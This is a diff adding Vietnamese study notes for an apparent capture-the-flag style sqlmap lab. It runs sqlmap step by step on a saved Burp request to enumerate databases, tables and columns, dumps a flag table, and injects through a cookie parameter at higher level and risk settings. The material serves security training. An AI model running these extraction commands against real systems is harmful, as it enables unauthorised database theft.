@@ -1,0 +1,83 @@
+Lưu request trong burp vào .txt 
+
+
+
+Chạy kiểm tra ( có nhiều cách nhưng chỉ nên dùng cách hiệu quả là cách này )     
+  sqlmap -r request.txt 
+
+ -> Ở bài lab này thu được [INFO] the back-end DBMS is MySQL
+
+Để liệt kê cơ sở dữ liệu, hãy thêm tùy chọn “-dbs”.
+  sqlmap -r request.txt --dbs
+
+  -> available databases [2]:
+      [*] information_schema
+      [*] testdb
+
+
+Combo Tùy chọn “ -D ” chỉ định tên của cơ sở dữ liệu và tùy chọn “ --tables ” được sử dụng để liệt kê tên của các bảng có trong cơ sở dữ liệu “public”.
+   sqlmap -r request.txt -D testdb --tables
+      ( lưu ý testdb là tên db đã tìm thấy ở bước trên ) 
+  -> Database: testdb
+      [2 tables]
+      +-------+
+      | flag2 |
+      | users |
+      +-------+
+
+Tùy chọn “ -T ” được sử dụng để chỉ định bảng. Mà nhắc đến bảng thì phải chọn cả DB nữa nên vẫn dữ liệu option -D 
+Tùy chọn “ --columns ” để liệt kê tên cột.
+  sqlmap -r request.txt -D testdb -T flag2 --columns
+
+  ->  Database: testdb
+      Table: flag2
+      [2 columns]
+      +---------+--------------+
+      | Column  | Type         |
+      +---------+--------------+
+      | content | varchar(512) |
+      | id      | int(11)      |
+      +---------+--------------+
+
+Với tùy chọn “ -C ”, chúng ta chọn các cột được phân tách bằng dấu phẩy. Tùy chọn “ -dump ” được sử dụng để trích xuất dữ liệu bảng.
+  sqlmap -r request.txt -D testdb -T flag2 -C content,id -dump
+
+  -> ok đọc được flag 1
+
+========================================================================================================================================================================
+========================================================================================================================================================================
+========================================================================================================================================================================
+
+Ok giờ tìm flag 2 
+
+    GET /case3.php HTTP/1.1
+    Host: 94.237.59.225:55467
+    Accept-Language: en-US,en;q=0.9
+    Upgrade-Insecure-Requests: 1
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+    Referer: http://94.237.59.225:55467/case3.php
+    Accept-Encoding: gzip, deflate, br
+    Cookie: id=1
+    Connection: keep-alive
+
+    Ta cần injection vào giá trị id ở cookie 
+    Điều kiện, muốn lưu đầu vào vào request.txt -> nếu muốn dùng cách này thì hãy học thêm tham só --level và --risk
+      Với bài lab này thì dùng 
+        --level=3 Test thêm nhiều header và tham số ẩn.
+        --risk=2  Payload mạnh hơn, có thể gây lỗi nhỏ hoặc chậm trang.  
+
+  sqlmap -r request.txt  --level=3 --risk=2
+
+    Flow như flag1 
+
+
+========================================================================================================================================================================
+========================================================================================================================================================================
+========================================================================================================================================================================
+
+
+
+Giải đầy đủ ở đây
+https://hackthedome.com/sqlmap-essentials/
+
